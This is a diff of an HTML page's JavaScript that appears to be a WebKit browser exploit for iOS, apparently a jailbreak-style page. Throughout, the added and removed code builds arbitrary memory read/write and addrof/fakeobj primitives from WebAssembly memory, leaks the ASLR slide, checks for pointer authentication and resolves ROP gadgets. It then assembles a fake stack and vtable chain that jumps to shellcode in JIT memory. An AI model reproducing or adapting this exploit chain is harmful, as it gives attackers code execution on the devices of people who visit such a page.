+		        return {read_i8: module.exports.read_i8, write_i8: module.exports.write_i8, read_i16: module.exports.read_i16, write_i16: module.exports.write_i16, read_i32: module.exports.read_i32, write_i32: module.exports.write_i32, read_i64: read_i64.bind(null, module.exports.read_i16), write_i64: write_i64.bind(null, module.exports.write_i16), module: module}
+		    }
+		   // Now edit our real Wasm memory
+		    var realWasmWriter = createObjWriter(realWasmMem);
+		    var realWasmInternalMemAddr = realWasmWriter.read_i64(3);
 
-		log.debug("Preparing shellcode with dlsym offset.");
-		primitives.write_i64(shellcode_src, 4, dlsym);
-		var fake_stack = [
-	    		0,
-	    		u32_buffer.byteLength, // x2
-	    		0,
+		    log.info("Real Wasm Internal Memory @ " + realWasmInternalMemAddr);
+		    wasmInternalBufferWriter = createDirectWriter(realWasmInternalMemAddr);
 
-		    	pop_x8,
+		    // Create an object leaker
+		    var leakerWriter = createObjWriter(leaker);
+		    
+		    // Set sizes to large values
+		    wasmInternalBufferWriter.write_i64(2, new Int64('0x0FFFFFFFFFFFFFFF'));
+		    wasmInternalBufferWriter.write_i64(3, new Int64('0x0FFFFFFFFFFFFFFF'));
+		    wasmInternalBufferWriter.write_i64(4, new Int64('0x0FFFFFFFFFFFFFFF'));
+		    var realInternalBufferAddr = wasmInternalBufferWriter.read_i64(1);
+		    importObject.imports.mem = realWasmMem;
 
-		    	0, 0, 0, 0, 0,
-		    	shellcode_dst, // x8
-		    	0, 0, 0, 0,
-		    	primitives.read_i64(ptr_stack_chk_guard) + 0x58,
+			primitives.addrof = function(obj) {
+		        leaker.objectToLeak = obj;
+		        return leakerWriter.read_i64(2);
+		    };
 
-		    	linkcode_gadget,
-		    	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
-		        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+		    primitives.fakeobj = function(addr) {
+		        leakerWriter.write_i64(2, addr);
+		        return leaker.objectToLeak;
+		    };
 
-		        shellcode_dst,
-		];
+		     // And createObjWriter
+		    primitives.createObjWriter = function(obj) 
+		    {
 
-		u32_buffer[0] = longjmp % BASE32;
-		u32_buffer[1] = longjmp / BASE32;
+		       	return createDirectWriter(primitives.addrof(obj));
+		    };
 
-		for(var i = 0; i < fake_stack.length; ++i)
+		    log.info("Cleaning up stage 1, this may take a while.");
+		    
+		    millis(100); // Sleep 100ms
+		    
+		    var writer = primitives.createObjWriter(wasmMem);
+		    writer.write_i64(0, Int64.One);
+
+		    var wasmBufferWriter = primitives.createObjWriter(wasmBuffer);
+		    var writer = primitives.createObjWriter(wasmInternalMemory);
+
+		    wasmBufferWriter.write_i64(0, new Int64('0x0000000000000007')); // Don't know why this works, lol
+		    wasmBufferWriter.write_i64(2, new Int64('0x0000000000000007'));
+		    
+		    writer.write_i64(4, Int64.Zero);
+		    writer.write_i64(5, Int64.Zero);
+		    writer.write_i64(6, Int64.Zero);
+		    writer.write_i64(7, Int64.Zero);
+
+		    writer.write_i64(0, new Int64('0x0000000000000007'));
+		    writer.write_i64(2, new Int64('0x0000000000000007'));
+
+			millis(1000); // Seems more stable with 1 second sleep
+				    
+			log.info("Cleanup complete. Crafting primitives.");
+				  	
+			var newprimitives = {};
+		    newprimitives.create_writer = function(addrObj) {
+		        if (addrObj instanceof Int64) {
+		            var writer = createDirectWriter(addrObj);
+		            return writer;
+		        } else {
+		            var writer = createObjWriter(addrObj);
+		            return writer;
+		        }
+		    };
+		    newprimitives.read_i64 = function(addrObj, offset) {
+		            var writer = newprimitives.create_writer(addrObj);
+		            return writer.read_i64(offset);
+		    };
+		    newprimitives.write_i64 = function(addrObj, offset, value) {
+		        var writer = newprimitives.create_writer(addrObj);
+		        writer.write_i64(offset, value);
+		    };
+
+		    newprimitives.write_non_zero = function(where, values)
+		    {
+		    	for(var i = 0; i < values.length; ++i)
+		    	{
+		    		if(values[i] != 0)
+		    		{
+		    			newprimitives.write_i64(Add(where,i*8),0, values[i]);
+		    		}
+		    	}
+		    };
+
+		    newprimitives.read_i32 = function(addrObj, offset) {
+		        var writer = newprimitives.create_writer(addrObj);
+		        return new Int64(writer.read_i32(offset));
+		    };
+		    newprimitives.write_i32 = function(addrObj, offset, value) {
+		        var writer = newprimitives.create_writer(addrObj);
+		        writer.write_i32(offset, value);
+		    };
+		    newprimitives.read_i8 = function(addrObj, offset) {
+		        var writer = newprimitives.create_writer(addrObj);
+		        return writer.read_i8(offset);
+		    };
+		    newprimitives.write_i8 = function(addrObj, offset, value) {
+		        var writer = newprimitives.create_writer(addrObj);
+		        writer.write_i8(offset, value);
+		    };
+		    newprimitives.copyto = function(addrObj, offset, data, length) {
+		        var writer = newprimitives.create_writer(addrObj);
+		        for (var i = 0; i < length; i++) {
+		            writer.write_i8(offset + i, data[i]);
+		        }
+		    };
+		    newprimitives.copyfrom = function(addrObj, offset, length) {
+		        var writer = newprimitives.create_writer(addrObj);
+		        var arr = new Uint8Array(length);
+		        for (var i = 0; i < length; i++) {
+		            arr[i] = writer.read_i8(offset + i);
+		        }
+		        return arr;
+		    };
+		    newprimitives.addrof = window.primitives.addrof;
+		    newprimitives.fakeobj = window.primitives.fakeobj;
+		    log.info("Got stable Memory R/W");
+		    window.primitives = newprimitives;
+		    millis(100);
+		};
+
+
+		var stage2 = function(_off) 
 		{
-	    		u32_buffer[0x2000/4 + 2*i] = fake_stack[i] % BASE32
-		        u32_buffer[0x2000/4 + 2*i+1] = fake_stack[i] / BASE32
+			var primitives = window.primitives;
+
+			/*
+			 * Function to see if the device has Control Flow Integrity (A12+)
+			*/
+	    	var hasPAC = function() {
+		        var sinFuncAddr = primitives.addrof(Math.sin);
+		        var executableAddr = primitives.read_i64(sinFuncAddr, 3);
+		        var jitCodeAddr = primitives.read_i64(executableAddr, 3);
+		        var rxMemAddr = primitives.read_i64(jitCodeAddr, 4);
+		        if (ShiftRight(rxMemAddr, 5) == 0) {
+		            return false; //iOS Pointer from Shared Library cache without PAC
+		        }
+		        return true; // Must have PAC then, right?
+		    };
+
+		    if(hasPAC()){
+				log.info("Detected device with CFI.");
+			}
+			else
+			{
+				log.debug("Detected device without CFI.");
+			}
+
+			/*
+			 * Strip the Pointer Authentication Code from an address.
+			*/
+		    primitives.strippac = function(addr)
+		    {
+			    var _pac = hasPAC();
+		    	return _pac ? And(addr, new Int64('0xFFFFFFFF8')) : addr;
+		    };
+		
+			function getjitfunc()
+		    {
+			    var shf = makejitfunc();
+			    var shf_addr = primitives.addrof(shf);
+			    log.info("Shellcode function @ " + shf_addr);
+			    var shfx_addr = primitives.read_i64(shf_addr, 3);
+			    log.info("Executable instance @ "+ shfx_addr);
+			    var shfc_addr = primitives.read_i64(shfx_addr, 3);
+			    log.info("JITCode instance @ " + shfc_addr);
+			    var shf_xregion = primitives.read_i64(shfc_addr, 4);
+			    shf_xregion = primitives.strippac(shf_xregion);
+			    log.info("Executable region @ " + shf_xregion); 
+			    return [shf, shfc_addr, shf_xregion];
+			};
+
+			var shf = getjitfunc();
+			
+			// This element is the element we target for leaking randomization and execution
+			var wrapper = document.createElement('div');
+			var el = primitives.read_i64(wrapper, FPO);
+		   	log.info("Element @ 0x"+el);
+
+			var nativejitcode = primitives.read_i64(el, 0);
+			log.info("Got nativejitcode @ "+nativejitcode);
+			dyld_cache_slide(_off.nativejitcode, nativejitcode);
+			slide = dyld_cache_slide();
+			
+			log.info("Slide: "+ hexify(slide));
+			
+			var jitWriteSeparateHeapsFunctionAddr = slideaddr(_off.jit_writeseperateheaps_func);
+			var jitWriteSeparateHeapsFunction = primitives.read_i64(jitWriteSeparateHeapsFunctionAddr, 0);
+			var useFastPermisionsJITCopyAddr = slideaddr(_off.usefastpermissions_jitcopy);
+			var useFastPermisionsJITCopy = primitives.read_i64(useFastPermisionsJITCopyAddr, 0);
+			
+			if (!useFastPermisionsJITCopy || jitWriteSeparateHeapsFunction) 
+		    {
+		    	log.info("Got an older device. We can use the legacy execution flow.");
+		    }
+		    else
+		    {
+		    	log.info("Got an iPhone 8 or up. We must use the modern execution flow.");
+		    }
+
+			log.debug("Finding the executable memorypool.");
+			var startOfFixedExecutableMemoryPoolAddr = slideaddr(_off.startfixedmempool);
+		   	var endOfFixedExecutableMemoryPoolAddr = slideaddr(_off.endfixedmempool);
+
+		   	var startOfFixedExecutableMemoryPool = primitives.read_i64(startOfFixedExecutableMemoryPoolAddr, 0);
+			var endOfFixedExecutableMemoryPool = Add(startOfFixedExecutableMemoryPool, (0x20000/2));
+
+			var jscbase = slideaddr(_off.jscbase);
+			var disablePrimitiveGigacage = slideaddr(_off.disableprimitivegigacage);
+
+			var callbacks = primitives.read_i64(slideaddr(_off.callbacks), 0);
+			var g_gigacageBasePtrs = slideaddr(_off.g_gigacagebaseptrs);
+
+	    	var g_typedArrayPoisons = slideaddr(_off.g_jsarraybufferpoison);
+
+	    	log.info('g_typedArrayPoisons: '+hexify(primitives.read_i64(g_typedArrayPoisons, 6*8)));
+
+		   	var longjmp = slideaddr(_off.longjmp);
+		    var dlsym = slideaddr(_off.dlsym);
+		    var ptr_stack_chk_guard = slideaddr(_off.ptr_stack_check_guard);
+			var linkcode_gadget = slideaddr(_off.linkcode_gadget);
+
+			log.info(''
+		        + '\nASLR Slide ' + hexify(slide) //dyld shared cache slide should be equal to the vtable infoleak minus the vtable offset
+		        + '\nJavaScriptCore base @ ' + (jscbase == slide ? "Offset missing" : hexify(jscbase))
+		        + '\ncallbacks @ ' + (callbacks == slide ? "Offset missing" : hexify(callbacks)) //callback vector
+		        + '\nlongjmp @ ' + (longjmp == slide ? "Offset missing" : hexify(longjmp)) //symbol
+		        + '\ndlsym @ ' + (dlsym == slide ? "Offset missing" : hexify(dlsym)) //dlsym symbol, used for referincing a symbol by string
+		        + '\ndisablePrimitiveGigacage @ ' + (disablePrimitiveGigacage == slide ? "Offset missing" : hexify(disablePrimitiveGigacage)) //symbol
+		        + '\ng_gigacageBasePtrs @ ' + (g_gigacageBasePtrs == slide ? "Offset missing" : hexify(g_gigacageBasePtrs)) //symbol
+		        + '\nlinkCode gadget @ ' + (linkcode_gadget == slide ? "Offset missing" : hexify(linkcode_gadget)) //symbol, used in stage2
+		        + '\njit_writeseperateheaps_func @ ' + (jitWriteSeparateHeapsFunctionAddr == slide ? "Offset missing" : hexify(jitWriteSeparateHeapsFunctionAddr))
+		        + '\nuseFastPermisionsJITCopy @ ' +  (useFastPermisionsJITCopyAddr == slide ? "Offset missing" : hexify(useFastPermisionsJITCopyAddr))
+		        + '\nstartfixedmempool @ ' + (startOfFixedExecutableMemoryPool == slide ? "Offset missing" : startOfFixedExecutableMemoryPool)
+		        + '\nendfixedmempool @ ' + (endOfFixedExecutableMemoryPool == slide ? "Offset missing" : hexify(endOfFixedExecutableMemoryPool))
+		        + '\nptr_stack_check_guard @ ' + (ptr_stack_chk_guard == slide ? "Offset missing" : hexify(ptr_stack_chk_guard))
+		    );
+
+			var pop_x8 = slideaddr(_off.modelio_popx8);
+			log.info("pop_x8 gadget: "+hexify(pop_x8));
+
+			var pop_x2 = slideaddr(_off.coreaudio_popx2);
+			log.info("pop_x2 gadget: "+hexify(pop_x2));
+
+			var buffer_addr = primitives.addrof(workbuf);
+			log.info("Shellcode buffer @ " +buffer_addr);
+
+			var shellcode_src = Add(buffer_addr, 0x4000);
+			log.info("Shellcode @ " + shellcode_src);
+
+			var shellcode_dst = endOfFixedExecutableMemoryPool;
+			log.info("Shellcode target @ " + hexify(shellcode_dst));
+
+			log.debug("Preparing shellcode with dlsym offset.");
+			primitives.write_i64(shellcode_src, 4, dlsym);
+			var fake_stack = [
+		    		0,
+		    		u32_buffer.byteLength, // x2
+		    		0,
+
+			    	pop_x8,
+
+			    	0, 0, 0, 0, 0,
+			    	shellcode_dst, // x8
+			    	0, 0, 0, 0,
+			    	primitives.read_i64(ptr_stack_chk_guard) + 0x58,
+
+			    	linkcode_gadget,
+			    	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+			        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+
+			        shellcode_dst,
+			];
+
+			u32_buffer[0] = longjmp % BASE32;
+			u32_buffer[1] = longjmp / BASE32;
+
+			for(var i = 0; i < fake_stack.length; ++i)
+			{
+		    		u32_buffer[0x2000/4 + 2*i] = fake_stack[i] % BASE32
+			        u32_buffer[0x2000/4 + 2*i+1] = fake_stack[i] / BASE32
+			}
+
+			primitives.write_i32(el, 0, buffer_addr);
+			primitives.write_i32(el, 16, shellcode_src);
+			primitives.write_i32(el, 64, pop_x2);
+			primitives.write_i32(el, 80, Add(buffer_addr, 0x2000));
+
+//		   	primitives.copyto(el, 0, ropchain.buffer, ropchain.buffer.byteLength);
+
+		  
+		   	log.warn("Executing shellcode!");
+			wrapper.addEventListener('click', function(){});
 		}
 
-		var ropchain = new Uint32Array([
-	    		buffer_addr, //fake vtable
-		    	0,
-		    	shellcode_src, // x21
-		    	0, 0, 0, 0, 0, 0, 0,
-		        0, // frame pointer
-		        pop_x2, // linking register
-		        0,
-		        buffer_addr + 0x2000, // stack pointer (will point to our fake stack)
-	   	]);
 
-	   	primitives.copyto(el, 0, ropchain.buffer, ropchain.buffer.byteLength);
-
-
-	   	log.warn("Executing shellcode!");
-		millis(100);
-		wrapper.addEventListener('click', function(){});
-	}
-
-
-	function go()
-	{
-		try
+		function go()
 		{
-			var prestage = init();
-			stage1();
-			millis(100);
-			stage2(prestage.offsets);
-		}
-		catch(ex)
-		{
-			alert((ex.message || "No message") + "\n" + (ex.stack || "No callstack"));
-			throw ex;
-		}
-		log.warn("We're done. Page will reload!");
-		millis(500);
-		window.location.reload();
-	};
+			try
+			{
+				disableBtn();
+				updateStatus('Initializing...');
+				var prestage = init();
+				updateStatus('Running stage1...');
+				stage1();
+				millis(100);
+				updateStatus('Running stage2...');
+				stage2(prestage.offsets);
+				updateStatus('Done!');
+				enableBtn();
+			}
+			catch(ex)
+			{
+				alert((ex.message || "No message") + "\n" + (ex.stack || "No callstack"));
+				throw ex;
+			}
+			log.warn("We're done!");
+			millis(500);
+		};
 		</script>
 	</head>
 	<body>
